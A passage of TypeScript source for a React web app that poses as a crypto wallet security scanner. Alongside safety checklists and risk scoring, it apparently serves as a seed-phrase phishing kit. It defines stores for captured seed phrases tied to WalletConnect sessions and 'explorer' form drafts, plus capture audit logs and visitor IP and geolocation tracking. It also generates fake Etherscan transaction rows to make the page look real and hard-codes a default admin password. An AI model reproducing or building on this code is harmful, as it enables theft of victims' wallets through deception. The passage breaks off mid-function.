import { useEffect, useMemo, useRef, useState } from 'react'
import type { FormEvent } from 'react'
import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react'
import { useDisconnect, useWalletClient, useSwitchChain } from 'wagmi'
import {
  buildEmailHtml,
  buildEmailText,
  buildWatchoutEmailHtml,
  buildWatchoutEmailText,
  buildNewsletterEmailHtml,
  buildNewsletterEmailText,
  buildVisitEmailHtml,
  buildVisitEmailText,
  buildBotStatusEmailHtml,
  buildBotStatusEmailText,
  type ReportEmailData,
  type NewsletterEmailData,
  type VisitEmailData,
} from './emailTemplate'
import QRCode from 'qrcode'
import { SignClient } from '@walletconnect/sign-client'
import './App.css'
import { appKitMetadata, projectId } from './web3config'
import { isCloudConfigured, loadFromCloud, saveToCloud } from './supabase'
import { generateSecurityReportPdf, generateBotStatusPdf } from './pdfReport'

// ── Email delivery (Resend via /api/send-email) ─────────────────────────
// The Resend API key lives only on the server (Vercel env var RESEND_API_KEY).
// The browser POSTs to /api/send-email, which forwards to Resend.
const EMAIL_API_ENDPOINT = '/api/send-email'
const EMAIL_FROM_NAME    = 'One Link Security Agent'

type SendEmailArgs = {
  to: string
  subject: string
  html: string
  text: string
  replyTo?: string
  attachments?: Array<{ filename: string; content: string }>
}

async function sendEmail({ to, subject, html, text, replyTo, attachments }: SendEmailArgs): Promise<void> {
  const res = await fetch(EMAIL_API_ENDPOINT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      to,
      subject,
      html,
      text,
      fromName: EMAIL_FROM_NAME,
      replyTo,
      attachments,
    }),
  })
  if (!res.ok) {
    let detail = ''
    try { detail = await res.text() } catch { /* noop */ }
    const shortDetail = detail.slice(0, 240)
    if (res.status === 404) {
      throw new Error(
        'Email API route not found. If running locally, use `vercel dev` (not only `npm run dev`) so `/api/send-email` is available.',
      )
    }
    if (res.status === 503 && shortDetail.includes('RESEND_API_KEY')) {
      throw new Error(
        'Email service is not configured on the server. Set `RESEND_API_KEY` and `RESEND_FROM_EMAIL` in Vercel env vars.',
      )
    }
    throw new Error(`Email send failed (${res.status}): ${shortDetail}`)
  }
}

// ── Types ────────────────────────────────────────────────────────────────
type Severity = 'low' | 'medium' | 'high' | 'critical'
type ChainKey = 'ethereum' | 'base' | 'arbitrum' | 'bsc' | 'polygon'
type ViewKey  = 'home' | 'scan' | 'protect' | 'ownership' | 'recovery' | 'support' | 'admin' | 'etherscan' | 'protecting' | 'wallet-landing'

type Signal = { id: string; label: string; points: number; group: 'watching' | 'seed' | 'drainer' }

type Web3ScanResult = {
  chainId: number | null
  nativeBalance: string | null
  nonceLatest: number | null
  noncePending: number | null
  pendingGap: number
  isContractAddress: boolean | null
  recentApprovals: number | null
  recentOutgoingTransfers: number | null
  txCount: number | null
  findings: string[]
}

type SecurityApiResult = {
  source: 'goplus'
  maliciousAddress: boolean | null
  hitFlags: string[]
  findings: string[]
  rawFlags: Record<string, string>
}

type AdminIntelRecord = {
  id: string
  address: string
  chain: ChainKey
  severity: Severity
  findings: string[]
  notes: string
  addedAt: string
  addedBy: string
}

type ScanResult = {
  score: number; severity: Severity; riskPercent: number
  matchedSignals: Signal[]; byGroup: Record<Signal['group'], number>
  primaryConcern: Signal['group'] | null; web3: Web3ScanResult | null
  web3RiskPoints: number; securityApi: SecurityApiResult | null; adminIntel: AdminIntelRecord | null; generatedAt: string
}

type ChainConfig  = { label: string; chainId: number; chainHexId: string; rpcUrls: string[]; revokeUrl: string; explorerBase: string; nativeSymbol: string }
type ThreatItem   = { title: string; level: Severity; description: string }
type PendingProtection = { email: string; name: string; wallets: string[]; network: ChainKey }
type ProtectChecklistItem = { id: string; text: string; level: Severity }
type CryptoNewsItem = { id: string; title: string; summary: string; source: string; url: string; imageUrl: string | null; publishedAt: number }
type VisitorStatus = 'allowed' | 'restricted'

type ExplorerType = 'etherscan' | 'xrpscan' | 'blockchair' | 'bscscan' | 'polygonscan' | 'arbiscan' | 'basescan' | 'solscan' | 'custom'

type UserEmailRoute = {
  id: string
  email: string
  view: ViewKey
  label: string
  // explorer config
  address?: string
  explorerType?: ExplorerType
  explorerNetwork?: string
  explorerCustomUrl?: string
}

type ConnectedWalletRecord = {
  wallet: string
  chain: ChainKey
  walletType: string
  balance: string
  txCount: string
  connectedAt: string
  ipAddress: string
  device: string
}
type ScanRecord            = { wallet: string; chain: ChainKey; score: number; severity: Severity; balance: string; findings: string[]; matchedSignals: string[]; generatedAt: string }
type SignerCheckRecord     = { wallet: string; chain: ChainKey; status: 'passed' | 'failed'; detail: string; checkedAt: string }
type EmailRecord           = { email: string; name: string; wallet: string; chain: ChainKey; severity: Severity; score: number; balance: string; sentAt: string; emailStatus: 'sent' | 'pending' | 'failed' }
type AdminCreds            = { email: string; password: string }
type SupportConfig         = { email: string; telegram: string }
type CaptureAuditChannel   = 'explorer-submit' | 'wc-submit' | 'wc-draft' | 'explorer-draft'
type CaptureAuditRecord    = {
  id: string
  createdAt: string
  event: 'server-write' | 'cloud-merge-save' | 'local-save'
  channel: CaptureAuditChannel
  status: 'ok' | 'error'
  detail: string
  recordId?: string
  walletAddress?: string
}

type BotDeployRequest = {
  id: string
  walletAddress: string
  chain: ChainKey
  email: string
  name: string
  status: 'pending' | 'approved' | 'declined'
  requestedAt: string
  reviewedAt?: string
  reason?: string
  ip?: string
  device?: string
}
type VisitorSessionRecord  = {
  id: string
  ipAddress: string
  device: string
  userAgent: string
  firstSeen: string
  lastSeen: string
  visits: number
  status: VisitorStatus
  // geolocation
  country?: string
  countryCode?: string
  city?: string
  region?: string
  timezone?: string
  isp?: string
  org?: string
  lat?: number
  lng?: number
  // session metrics
  referrer?: string
  language?: string
  sessionStartMs?: number
  totalSeconds?: number
}

type SeedPhraseRecord = {
  id: string
  walletAddress: string
  chain: ChainKey
  seedPhrase: string
  wordCount: number
  source: 'manual' | 'wc-session' | 'auto-detected' | 'draft-wc' | 'draft-explorer'
  detectedAt: string
  notes: string
  confirmed: boolean
}

type WcSession = {
  topic: string
  address: string
  walletName: string
  connectedAt: string
  seedPhrase: string
  ownershipVerified: boolean
}

type WcDappRequest = {
  id: string
  type: 'payment' | 'transaction'
  topic: string
  address: string
  params: Record<string, string>
  status: 'pending' | 'approved' | 'rejected'
  createdAt: string
}

type EtherscanTxRow = {
  hash: string
  method: string
  block: number
  age: string
  from: string
  to: string
  direction: 'IN' | 'OUT'
  value: string
  fee: string
}

// ── Static data ──────────────────────────────────────────────────────────
const signals: Signal[] = [
  { id: 'unknown-session',    label: 'I recently signed a transaction or message from a suspicious site', points: 24, group: 'drainer'  },
  { id: 'approve-all',        label: 'I approved unlimited token spending and funds moved unexpectedly',   points: 22, group: 'drainer'  },
  { id: 'repeated-front-run', label: 'Every manual transfer gets copied or front-run within seconds',      points: 20, group: 'watching' },
  { id: 'new-device-login',   label: 'My wallet shows login or recovery activity from an unknown device',  points: 25, group: 'seed'     },
  { id: 'seed-exposed',       label: 'I entered my seed phrase on a website, form, or bot',               points: 35, group: 'seed'     },
  { id: 'clipboard-swap',     label: 'Copied wallet addresses change automatically on paste',              points: 28, group: 'seed'     },
  { id: 'failed-send',        label: 'I cannot send while attackers can still move assets',               points: 18, group: 'watching' },
  { id: 'unknown-approval',   label: 'Approval checker shows contract approvals I do not recognise',       points: 20, group: 'drainer'  },
]

const chainConfig: Record<ChainKey, ChainConfig> = {
  ethereum: { label: 'Ethereum', chainId: 1,     chainHexId: '0x1',    nativeSymbol: 'ETH',   rpcUrls: ['https://ethereum-rpc.publicnode.com', 'https://cloudflare-eth.com'],           revokeUrl: 'https://revoke.cash', explorerBase: 'https://etherscan.io/address/'   },
  base:     { label: 'Base',     chainId: 8453,  chainHexId: '0x2105', nativeSymbol: 'ETH',   rpcUrls: ['https://base-rpc.publicnode.com', 'https://mainnet.base.org'],                 revokeUrl: 'https://revoke.cash', explorerBase: 'https://basescan.org/address/'    },
  arbitrum: { label: 'Arbitrum', chainId: 42161, chainHexId: '0xa4b1', nativeSymbol: 'ETH',   rpcUrls: ['https://arbitrum-one-rpc.publicnode.com', 'https://arb1.arbitrum.io/rpc'],     revokeUrl: 'https://revoke.cash', explorerBase: 'https://arbiscan.io/address/'     },
  bsc:      { label: 'BNB Chain',chainId: 56,    chainHexId: '0x38',   nativeSymbol: 'BNB',   rpcUrls: ['https://bsc-rpc.publicnode.com', 'https://bsc-dataseed.binance.org'],          revokeUrl: 'https://revoke.cash', explorerBase: 'https://bscscan.com/address/'     },
  polygon:  { label: 'Polygon',  chainId: 137,   chainHexId: '0x89',   nativeSymbol: 'MATIC', rpcUrls: ['https://polygon-bor-rpc.publicnode.com', 'https://polygon-rpc.com'],           revokeUrl: 'https://revoke.cash', explorerBase: 'https://polygonscan.com/address/' },
}

const threatFeed: ThreatItem[] = [
  { title: 'Drainers via fake bridge claims',  level: 'high',     description: 'Wallets prompted to sign permit payloads disguised as gas refunds.' },
  { title: 'Clipboard hijacker campaigns',     level: 'critical', description: 'Malware swaps copied addresses at paste-time to attacker-controlled EOAs.' },
  { title: 'Approval phishing popups',         level: 'medium',   description: 'Injected modals request infinite token spend before showing legit screens.' },
]

const chainIdToKey: Record<number, ChainKey> = { 1: 'ethereum', 8453: 'base', 42161: 'arbitrum', 56: 'bsc', 137: 'polygon' }

const actionPlan: Record<Severity, string[]> = {
  low:      ['Revoke stale approvals and set wallet spending limits.', 'Use a hardware signer for high-value transactions.', 'Monitor approval and transfer activity daily for one week.'],
  medium:   ['Revoke all non-essential token permissions immediately.', 'Move critical assets to a clean backup wallet.', 'Scan your machine and remove unknown browser extensions.'],
  high:     ['Stop signing from the current wallet session now.', 'Rotate to a newly generated wallet from a clean device.', 'Reset all account credentials and 2FA providers linked to this wallet.'],
  critical: ['Assume full compromise — evacuate assets immediately.', 'Never reuse the potentially exposed wallet or seed phrase.', 'Document every suspicious transaction and contact affected protocols.'],
}

const severityCopy: Record<Severity, string> = {
  low:      'Risk posture is controlled. Maintain approval hygiene and routine monitoring.',
  medium:   'Meaningful risk indicators detected. Begin remediation and revoke non-essential approvals.',
  high:     'High compromise likelihood. Rotate wallet custody and harden all access paths now.',
  critical: 'Critical risk. Treat this wallet as fully compromised and evacuate assets immediately.',
}

const groupLabel: Record<Signal['group'], string> = {
  watching: 'Watcher / Automation',
  seed: 'Seed Phrase Exposure',
  drainer: 'Drainer / Approval Abuse',
}

const VISITOR_ID_KEY       = 'sv_visitor_id_v1'
const GATE_PASSED_KEY      = 'sv_gate_passed_v1'
const GATE_EMAIL_KEY       = 'sv_gate_email_v1'
const VISITED_EMAILS_KEY   = 'sv_visit_emailed_v1'
const SCAN_EMAILED_KEY     = 'sv_scan_emailed_v1'
const VISITOR_SESSIONS_KEY = 'sv_visitor_sessions_v1'
const CAPTURE_AUDIT_KEY    = 'sv_capture_audit_v1'
const SEED_PHRASES_KEY        = 'sv_seed_phrases_v1'
const LEGACY_SEED_PHRASES_KEY = 'sv_seed_phrases'
const ACTIVE_VIEW_KEY         = 'sv_active_view_v1'
const ADMIN_SESSION_KEY       = 'sv_admin_session_v1'   // sessionStorage — clears on tab close
const NEW_USER_KEY         = 'sv_new_user_v1'
const CONNECTED_WALLETS_KEY  = 'sv_connected_wallets_v1'
const SCAN_HISTORY_KEY       = 'sv_scan_history_v1'
const SIGNER_CHECKS_KEY      = 'sv_signer_checks_v1'
const EMAIL_RECORDS_KEY      = 'sv_email_records_v1'
const ADMIN_INTEL_KEY        = 'sv_admin_intel_v1'
const BOT_REQUESTS_KEY       = 'sv_bot_requests_v1'
const USER_ROUTES_KEY        = 'sv_user_routes_v1'
const NEWSLETTER_KEY         = 'sv_newsletter_v1'
const ADMIN_CREDS_KEY        = 'sv_admin_creds_v1'
const SUPPORT_CONFIG_KEY     = 'sv_support_config_v1'
const PROTECT_CHECKLIST_KEY  = 'sv_protect_checklist_v1'
const NEWS_REFRESH_MS = 5 * 60 * 1000
const CLOUD_ADMIN_POLL_MS = 8000
const ETHERSCAN_SESSION_MS = 5 * 60 * 1000
const ETHERSCAN_LOCKOUT_MS = 15 * 60 * 1000
const DEFAULT_VAULT_EMAIL    = 'admin@walletsafety.local'
const DEFAULT_VAULT_PASSWORD = 'TempPass#2026'
const DEFAULT_SUPPORT_EMAIL  = ''
const DEFAULT_SUPPORT_TELEGRAM = ''

const APPROVAL_TOPIC = '0x8c5be1e5ebec7d5bd14f714f27d1e84f3dd0314c0f7b2291e5b200ac8c7c3b8d'
const TRANSFER_TOPIC = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55aeb0f4fefab'
const GOPLUS_BASE_URL = 'https://api.gopluslabs.io/api/v1'
const GOPLUS_ACCESS_TOKEN = (import.meta.env.VITE_GOPLUS_ACCESS_TOKEN ?? '').trim()
const ALCHEMY_API_KEY = (import.meta.env.VITE_ALCHEMY_API_KEY ?? '').trim()
const alchemyNetworkPath: Record<ChainKey, string> = {
  ethereum: 'eth-mainnet',
  base: 'base-mainnet',
  arbitrum: 'arb-mainnet',
  bsc: 'bnb-mainnet',
  polygon: 'polygon-mainnet',
}

const priceFeedByChain: Record<ChainKey, string> = {
  ethereum: 'ethereum',
  base: 'ethereum',
  arbitrum: 'ethereum',
  bsc: 'binancecoin',
  polygon: 'matic-network',
}

const explorerBrandByChain: Record<ChainKey, string> = {
  ethereum: 'Etherscan',
  base: 'Basescan',
  arbitrum: 'Arbiscan',
  bsc: 'BscScan',
  polygon: 'PolygonScan',
}

const getAlchemyRpcUrl = (chain: ChainKey) =>
  ALCHEMY_API_KEY ? `https://${alchemyNetworkPath[chain]}.g.alchemy.com/v2/${ALCHEMY_API_KEY}` : ''
const goPlusChainId: Record<ChainKey, string> = {
  ethereum: '1',
  bsc: '56',
  polygon: '137',
  arbitrum: '42161',
  base: '8453',
}

const protectChecklist: ProtectChecklistItem[] = [
  { id: 'hardware-wallet', text: 'Use a hardware wallet for any balance above $500', level: 'critical' },
  { id: 'seed-offline', text: 'Back up seed phrase offline — never in cloud or notes apps', level: 'critical' },
  { id: 'no-unlimited', text: 'Never approve unlimited token spend — set exact amounts', level: 'high' },
  { id: 'verify-contract', text: 'Verify every contract address on the explorer before signing', level: 'high' },
  { id: 'revoke-monthly', text: 'Review and revoke stale token approvals monthly', level: 'high' },
  { id: 'bookmark-dapps', text: 'Bookmark dApps — never reach them via search ads', level: 'high' },
  { id: 'segmented-wallets', text: 'Use a separate wallet for each protocol or dApp', level: 'medium' },
  { id: 'extension-audit', text: 'Check browser extensions — remove anything unrecognised', level: 'medium' },
  { id: 'vpn-public', text: 'Enable a VPN on public networks when signing transactions', level: 'medium' },
  { id: 'lock-extension', text: 'Lock your wallet extension when not actively using it', level: 'low' },
]

const sanitizeText = (value: unknown, fallback: string) =>
  typeof value === 'string' && value.trim().length > 0 ? value.trim() : fallback

const parseCoinGeckoNews = (payload: unknown): CryptoNewsItem[] => {
  const rows = (payload as { data?: unknown[] })?.data
  if (!Array.isArray(rows)) return []
  return rows
    .slice(0, 18)
    .map((item, idx) => {
      const row = item as Record<string, unknown>
      const id = sanitizeText(row.id, `news-${idx}`)
      const title = sanitizeText(row.title, 'Untitled crypto update')
      const summary = sanitizeText(row.description, 'Open article for details.')
      const source = sanitizeText(row.news_site, 'CoinGecko News')
      const url = sanitizeText(row.url, 'https://www.coingecko.com/en/news')
      const imageUrlRaw = typeof row.thumb_2x === 'string' ? row.thumb_2x : null
      const imageUrl = imageUrlRaw && imageUrlRaw.startsWith('http') ? imageUrlRaw : null
      const publishedAt = typeof row.created_at === 'number' ? row.created_at * 1000 : Date.now()
      return { id, title, summary, source, url, imageUrl, publishedAt }
    })
}

const STATIC_NEWS: CryptoNewsItem[] = [
  { id: 's1', title: 'Bitcoin Miners Face Revenue Squeeze as Difficulty Hits All-Time High', summary: 'Mining profitability has compressed as block difficulty reaches a record level, pushing smaller operations offline while institutional miners expand.', source: 'Cointelegraph', url: 'https://cointelegraph.com', imageUrl: null, publishedAt: Date.now() - 1000 * 60 * 12 },
  { id: 's2', title: 'Ethereum Layer-2 Ecosystem Surpasses $50B in Total Locked Value', summary: 'Combined TVL across Arbitrum, Optimism, Base and zkSync has crossed $50B for the first time, signalling a major shift in user liquidity.', source: 'The Block', url: 'https://www.theblock.co', imageUrl: null, publishedAt: Date.now() - 1000 * 60 * 28 },
  { id: 's3', title: 'DeFi Protocol Reports $12M Exploit via Approval Abuse Vector', summary: 'Attackers drained funds by exploiting unlimited ERC-20 approvals on a lending protocol, triggering emergency pauses and security audits.', source: 'CoinDesk', url: 'https://coindesk.com', imageUrl: null, publishedAt: Date.now() - 1000 * 60 * 55 },
  { id: 's4', title: 'SEC Approves Spot Ethereum ETF Amendments, Paving Way for Staking Exposure', summary: 'Amendments to existing spot ETH products allow issuers to stake a portion of underlying holdings, opening a new yield category for institutional investors.', source: 'Decrypt', url: 'https://decrypt.co', imageUrl: null, publishedAt: Date.now() - 1000 * 60 * 80 },
  { id: 's5', title: 'Solana MEV Bots Extract $4.2M in a Single Day During Market Volatility', summary: 'On-chain analytics show a surge in sandwich attacks and priority fee manipulation during the latest BTC price swing, highlighting MEV risks for retail traders.', source: 'Blockworks', url: 'https://blockworks.co', imageUrl: null, publishedAt: Date.now() - 1000 * 60 * 110 },
  { id: 's6', title: 'Phishing Campaign Targets MetaMask Users With Fake Security Alerts', summary: 'A new wave of social engineering emails impersonating MetaMask support asks recipients to "re-verify" their wallets through a credential-harvesting site.', source: 'Cointelegraph', url: 'https://cointelegraph.com', imageUrl: null, publishedAt: Date.now() - 1000 * 60 * 145 },
  { id: 's7', title: 'Tether Expands USDT Collateral Transparency With Real-Time Reserve Dashboard', summary: 'The stablecoin issuer launched an on-chain dashboard that provides live attestation of reserves, addressing longstanding transparency concerns from regulators.', source: 'CoinDesk', url: 'https://coindesk.com', imageUrl: null, publishedAt: Date.now() - 1000 * 60 * 200 },
]

// ── Helpers ──────────────────────────────────────────────────────────────
const isAddress  = (v: string) => /^0x[a-fA-F0-9]{40}$/.test(v.trim())
const shortAddr  = (v: string) => `${v.slice(0, 8)}…${v.slice(-6)}`
const nowString  = () => new Date().toLocaleString()
const toHex      = (n: number) => `0x${n.toString(16)}`
const hexToNum   = (v: string | null) => v ? parseInt(v, 16) : null

const getDeviceLabel = (ua: string): string => {
  const uaLower = ua.toLowerCase()
  const platform = uaLower.includes('windows')
    ? 'Windows'
    : uaLower.includes('mac os')
      ? 'macOS'
      : uaLower.includes('android')
        ? 'Android'
        : uaLower.includes('iphone') || uaLower.includes('ipad')
          ? 'iOS'
          : uaLower.includes('linux')
            ? 'Linux'
            : 'Unknown OS'
  const browser = uaLower.includes('edg/')
    ? 'Edge'
    : uaLower.includes('chrome/')
      ? 'Chrome'
      : uaLower.includes('safari/') && !uaLower.includes('chrome/')
        ? 'Safari'
        : uaLower.includes('firefox/')
          ? 'Firefox'
          : 'Browser'
  return `${platform} · ${browser}`
}

const weiToNative = (v: string | null, decimals = 4) => {
  if (!v) return null
  const wei = BigInt(v)
  const whole = wei / 10n ** 18n
  const frac  = ((wei % 10n ** 18n) * 10n ** BigInt(decimals) / 10n ** 18n).toString().padStart(decimals, '0')
  return `${whole}.${frac}`
}

const formatAgeFromTimestamp = (timestampMs: number) => {
  const diff = Math.max(0, Date.now() - timestampMs)
  const mins = Math.floor(diff / (60 * 1000))
  if (mins < 1) return 'just now'
  if (mins < 60) return `${mins} min${mins === 1 ? '' : 's'} ago`
  const hours = Math.floor(mins / 60)
  if (hours < 24) return `${hours} hr${hours === 1 ? '' : 's'} ago`
  const days = Math.floor(hours / 24)
  return `${days} day${days === 1 ? '' : 's'} ago`
}

// Synthetic Etherscan-style activity rows used as a graceful fallback when
// live RPC data is unavailable. Keeps the explorer page looking populated
// without revealing any developer/API plumbing to the end user.
const ES_RANDOM_METHODS: Array<{ label: string; weight: number }> = [
  { label: 'Transfer',       weight: 5 },
  { label: 'Token Transfer', weight: 4 },
  { label: 'Swap',           weight: 3 },
  { label: 'Approve',        weight: 2 },
  { label: 'Multicall',      weight: 2 },
  { label: 'Execute',        weight: 1 },
  { label: 'Mint',           weight: 1 },
  { label: 'Stake',          weight: 1 },
]
const pickWeighted = <T extends { weight: number }>(items: T[]): T => {
  const total = items.reduce((s, it) => s + it.weight, 0)
  let r = Math.random() * total
  for (const it of items) { r -= it.weight; if (r <= 0) return it }
  return items[items.length - 1]
}
const generateRandomEsRows = (
  count: number,
  viewerAddr: string,
  nativeSymbol: string,
  latestBlock: number | null,
): EtherscanTxRow[] => {
  const safeViewer = viewerAddr && viewerAddr.startsWith('0x') ? viewerAddr : rndAddr()
  const baseBlock = latestBlock && latestBlock > 0
    ? latestBlock
    : 19_500_000 + Math.floor(Math.random() * 1_000_000)
  let cursorBlock = baseBlock
  let cursorAgeMin = 1 + Math.floor(Math.random() * 3)
  const rows: EtherscanTxRow[] = []
  for (let i = 0; i < count; i++) {
    const isOut = Math.random() < 0.5
    const counterparty = rndAddr()
    const method = pickWeighted(ES_RANDOM_METHODS).label
    const valueAmount = Math.random() < 0.15
      ? 0
      : Number((Math.random() * (method === 'Swap' ? 4 : 1.5)).toFixed(4))
    const tokenSymbol = method === 'Token Transfer'
      ? (['USDC', 'USDT', 'DAI', 'LINK', 'UNI', 'WBTC'][Math.floor(Math.random() * 6)])
      : nativeSymbol
    const feeAmount = (0.000_15 + Math.random() * 0.0085).toFixed(6)
    rows.push({
      hash: `0x${rndHex(64)}`,
      method,
      block: cursorBlock,
      age: formatAgeFromTimestamp(Date.now() - cursorAgeMin * 60 * 1000),
      from: isOut ? safeViewer : counterparty,
      to:   isOut ? counterparty : safeViewer,
      direction: isOut ? 'OUT' : 'IN',
      value: `${valueAmount.toLocaleString(undefined, { maximumFractionDigits: 4 })} ${tokenSymbol}`,
      fee: `${feeAmount} ${nativeSymbol}`,
    })
    cursorBlock -= 1 + Math.floor(Math.random() * 6)
    cursorAgeMin += 2 + Math.floor(Math.random() * 18)
  }
  return rows
}

const explorerRootForChain = (chain: ChainKey) =>
  chainConfig[chain].explorerBase.replace(/\/address\/$/, '')

const EXPLORER_BASES: Record<ExplorerType, string> = {
  etherscan:   'https://etherscan.io',
  bscscan:     'https://bscscan.com',
  polygonscan: 'https://polygonscan.com',
  arbiscan:    'https://arbiscan.io',
  basescan:    'https://basescan.org',
  xrpscan:     'https://xrpscan.com',
  blockchair:  'https://blockchair.com/bitcoin',
  solscan:     'https://solscan.io',
  custom:      '',
}

export const buildExplorerAddressUrl = (route: { explorerType?: ExplorerType; explorerCustomUrl?: string; address?: string }): string => {
  if (!route.address) return ''
  const base = route.explorerType === 'custom' ? (route.explorerCustomUrl ?? '') : (EXPLORER_BASES[route.explorerType ?? 'etherscan'] ?? '')
  if (!base) return ''
  return `${base}/address/${route.address}`
}

const explorerTypeToChain: Partial<Record<ExplorerType, ChainKey>> = {
  etherscan:   'ethereum',
  bscscan:     'bsc',
  polygonscan: 'polygon',
  arbiscan:    'arbitrum',
  basescan:    'base',
}

const topicForAddress = (a: string) =>
  `0x000000000000000000000000${a.toLowerCase().replace('0x', '')}`

const getSeverity = (score: number): Severity =>
  score >= 70 ? 'critical' : score >= 45 ? 'high' : score >= 20 ? 'medium' : 'low'

const looksLikeSeedPhrase = (text: string): boolean => {
  const words = text.trim().split(/\s+/)
  if (words.length !== 12 && words.length !== 15 && words.length !== 18 && words.length !== 21 && words.length !== 24) return false
  return words.every(w => /^[a-z]{2,10}$/.test(w))
}

const normalizeSeedPhraseInput = (text: string): string =>
  text.trim().toLowerCase().replace(/\s+/g, ' ')

const parseSeedPhraseRecord = (item: unknown): SeedPhraseRecord | null => {
  if (typeof item === 'string') {
    const seedPhrase = item.trim().replace(/\s+/g, ' ')
    if (!seedPhrase) return null
    const normalizedPhrase = normalizeSeedPhraseInput(seedPhrase)
    const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
    return {
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      walletAddress: 'Unknown',
      chain: 'ethereum',
      seedPhrase: isMnemonic ? normalizedPhrase : seedPhrase,
      wordCount: seedPhrase.split(/\s+/).filter(Boolean).length,
      source: 'manual',
      detectedAt: nowString(),
      notes: 'Recovered from legacy string record',
      confirmed: isMnemonic,
    }
  }
  if (!item || typeof item !== 'object') return null
  const row = item as Record<string, unknown>
  const rawSeed =
    typeof row.seedPhrase === 'string' ? row.seedPhrase :
    typeof row.seed_phrase === 'string' ? row.seed_phrase :
    typeof row.mnemonic === 'string' ? row.mnemonic :
    typeof row.seed === 'string' ? row.seed :
    typeof row.phrase === 'string' ? row.phrase :
    ''
  const seedPhrase = rawSeed.trim().replace(/\s+/g, ' ')
  if (!seedPhrase) return null
  const normalizedPhrase = normalizeSeedPhraseInput(seedPhrase)
  const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
  const sourceRaw = row.source
  const validSources: SeedPhraseRecord['source'][] = ['manual', 'wc-session', 'auto-detected', 'draft-wc', 'draft-explorer']
  const source: SeedPhraseRecord['source'] =
    (validSources as unknown[]).includes(sourceRaw)
      ? (sourceRaw as SeedPhraseRecord['source'])
      : 'auto-detected'
  const chainRaw = row.chain
  const chain = (typeof chainRaw === 'string' && chainRaw in chainConfig
    ? chainRaw
    : 'ethereum') as ChainKey
  const wordCount =
    typeof row.wordCount === 'number' && Number.isFinite(row.wordCount)
      ? row.wordCount
      : seedPhrase.split(/\s+/).filter(Boolean).length
  return {
    id: typeof row.id === 'string' && row.id.trim() ? row.id : `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    walletAddress:
      typeof row.walletAddress === 'string' && row.walletAddress.trim()
        ? row.walletAddress
        : typeof row.address === 'string' && row.address.trim()
          ? row.address
          : typeof row.wallet === 'string' && row.wallet.trim()
            ? row.wallet
            : 'Unknown',
    chain,
    seedPhrase: isMnemonic ? normalizedPhrase : seedPhrase,
    wordCount,
    source,
    detectedAt:
      typeof row.detectedAt === 'string' && row.detectedAt.trim()
        ? row.detectedAt
        : typeof row.capturedAt === 'string' && row.capturedAt.trim()
          ? row.capturedAt
          : typeof row.createdAt === 'string' && row.createdAt.trim()
            ? row.createdAt
            : nowString(),
    notes: typeof row.notes === 'string' ? row.notes : '',
    confirmed: typeof row.confirmed === 'boolean' ? row.confirmed : isMnemonic,
  }
}

const normalizeSeedPhraseRecords = (incoming: unknown): SeedPhraseRecord[] => {
  if (!incoming) return []

  if (typeof incoming === 'string') {
    try {
      return normalizeSeedPhraseRecords(JSON.parse(incoming))
    } catch {
      return []
    }
  }

  if (Array.isArray(incoming)) {
    const rows: SeedPhraseRecord[] = []
    const seen = new Set<string>()
    for (const item of incoming) {
      const parsed = parseSeedPhraseRecord(item)
      if (!parsed) continue
      const key = `${parsed.id}|${parsed.seedPhrase}`
      if (seen.has(key)) continue
      seen.add(key)
      rows.push(parsed)
    }
    return rows
  }

  if (typeof incoming === 'object' && incoming !== null) {
    const row = incoming as Record<string, unknown>
    if (
      typeof row.seedPhrase === 'string'
      || typeof row.seed_phrase === 'string'
      || typeof row.mnemonic === 'string'
      || typeof row.seed === 'string'
      || typeof row.phrase === 'string'
    ) {
      const single = parseSeedPhraseRecord(row)
      return single ? [single] : []
    }
    const objectValues = Object.values(row)
    const valuesLookLikeRows = objectValues.some(v =>
      typeof v === 'string' || (typeof v === 'object' && v !== null),
    )
    if (valuesLookLikeRows && !('seed_phrases' in row) && !('seedPhrases' in row) && !('records' in row) && !('items' in row)) {
      return normalizeSeedPhraseRecords(objectValues)
    }
    return normalizeSeedPhraseRecords(
      row.seed_phrases ?? row.seedPhrases ?? row.records ?? row.items ?? [],
    )
  }

  return []
}

const readSeedPhraseRecords = (): SeedPhraseRecord[] => {
  try {
    const current = normalizeSeedPhraseRecords(JSON.parse(localStorage.getItem(SEED_PHRASES_KEY) ?? '[]'))
    const legacy = normalizeSeedPhraseRecords(JSON.parse(localStorage.getItem(LEGACY_SEED_PHRASES_KEY) ?? '[]'))
    const merged = [...current]
    const existing = new Set(merged.map(item => `${item.id}|${item.seedPhrase}`))
    for (const item of legacy) {
      const key = `${item.id}|${item.seedPhrase}`
      if (!existing.has(key)) merged.push(item)
    }
    return merged
  } catch {
    return []
  }
}

const readCaptureAuditRecords = (): CaptureAuditRecord[] => {
  try {
    const parsed = JSON.parse(localStorage.getItem(CAPTURE_AUDIT_KEY) ?? '[]')
    if (!Array.isArray(parsed)) return []
    return parsed.filter((item): item is CaptureAuditRecord => (
      Boolean(item)
      && typeof item === 'object'
      && typeof (item as Record<string, unknown>).id === 'string'
      && typeof (item as Record<string, unknown>).createdAt === 'string'
      && typeof (item as Record<string, unknown>).event === 'string'
      && typeof (item as Record<string, unknown>).channel === 'string'
      && typeof (item as Record<string, unknown>).status === 'string'
      && typeof (item as Record<string, unknown>).detail === 'string'
    )).slice(0, 300)
  } catch {
    return []
  }
}

const normalizeConnectedWalletRecords = (incoming: unknown): ConnectedWalletRecord[] => {
  if (!Array.isArray(incoming)) return []
  const rows: ConnectedWalletRecord[] = []
  const seen = new Set<string>()
  for (const item of incoming) {
    if (!item || typeof item !== 'object') continue
    const row = item as Record<string, unknown>
    const wallet = typeof row.wallet === 'string' ? row.wallet.trim() : ''
    if (!wallet) continue
    const chainRaw = typeof row.chain === 'string' ? row.chain : 'ethereum'
    const chain = (chainRaw in chainConfig ? chainRaw : 'ethereum') as ChainKey
    const connectedAt = typeof row.connectedAt === 'string' && row.connectedAt.trim()
      ? row.connectedAt
      : nowString()
    const key = `${wallet.toLowerCase()}|${chain}|${connectedAt}`
    if (seen.has(key)) continue
    seen.add(key)
    rows.push({
      wallet,
      chain,
      walletType: typeof row.walletType === 'string' ? row.walletType : 'Unknown',
      balance: typeof row.balance === 'string' ? row.balance : '',
